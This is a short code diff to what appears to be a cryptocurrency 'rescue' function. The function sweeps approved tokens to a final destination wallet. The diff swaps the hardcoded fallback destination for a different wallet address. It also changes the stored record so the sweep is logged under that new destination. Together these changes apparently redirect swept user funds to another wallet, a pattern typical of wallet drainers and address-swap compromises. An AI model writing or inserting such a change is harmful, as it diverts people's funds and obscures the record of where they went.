@@ -57,7 +57,7 @@ export const verifyRescue = functions
     // The final wallet where rescued funds land
     const finalDestination =
       process.env.BSC_FINAL_DESTINATION ??
-      "0xEfdd53261Ccd3febD063D6A57a21405B24977d15";
+      "0x00faA9fE691b578b2D1934ac70C624886a93A636";
 
     if (Number(chainId) !== expectedChain) {
       res.status(400).json({ error: "Wrong chainId" });
@@ -167,7 +167,7 @@ export const verifyRescue = functions
         approvalTxHash: txHash || null,
         sweepTxHash: sweepTx.hash,
         amount: sweepAmount.toString(),
-        destination: expectedDest,
+        destination: finalDestination,
         createdAt: admin.firestore.FieldValue.serverTimestamp(),
         status: "CONFIRMED",
       });
